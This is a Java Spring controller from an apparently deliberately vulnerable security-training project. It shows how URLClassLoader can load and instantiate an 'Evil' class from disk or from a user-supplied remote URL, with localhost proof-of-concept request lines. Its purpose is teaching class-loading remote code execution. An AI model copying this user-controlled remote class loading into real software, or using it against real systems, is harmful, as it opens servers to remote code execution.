package com.madaha.codesecone.controller.AdvancedAttack.classloader;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.File;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * URLClassLoader：
 *    URLClassLoader 类继承 ClassLoader 类，可以加载本地磁盘和网络中的jar包类文件。
 *
 * evil 恶意类加载
 * byte[].class 类字节码加载
 */
@RestController
@RequestMapping("/URLClassLoader")
public class ClassDataLoader {

    // Save the URLClassLoader_Evil file this folder!
    private static final String EvilPath_FOLDER = System.getProperty("user.dir") + "/src/main/resources/static/evil/urlClassLoader/";

    /**
     * @poc http://127.0.0.1:28888/URLClassLoader/filePathVul
     *
     * 利用 URLClassLoader 方式去获取“磁盘”中的 Evil.class 文件。
     */
    @GetMapping("/filePathVul")
    public String filePathVul(){
        try {
            File file = new File(EvilPath_FOLDER);
            URI uri = file.toURI();
            URL url = uri.toURL();

            URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
            Class clazz = classLoader.loadClass("com.madaha.codesecone.controller.AdvancedAttack.classloader.Evil");
            clazz.newInstance();

            return "类加载成功，命令执行。";

        }catch (Exception e){
            e.printStackTrace();
            return "类加载异常！";
        }
    }


    /**
     * 利用 URLClassLoader 去加载远程 服务器 上的恶意类，造成RCE。
     *
     * @poc http://127.0.0.1:28888/URLClassLoader/urlPathVul?urlPath=http://127.0.0.1:8000&className=com.madaha.codesecone.controller.AdvancedAttack.classloader.Evil
     *
     * @param urlPath
     * @param className
     * @return
     */
    @GetMapping("/urlPathVul")
    public String urlPathVul(String urlPath, String className){
        try {
            URL url = new URL(urlPath);
            URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
            Class clazz = classLoader.loadClass(className);
            clazz.newInstance();

            return "类加载成功, 命令执行。";

        }catch (Exception e){
            e.printStackTrace();
            return "类加载异常！";
        }

    }


}
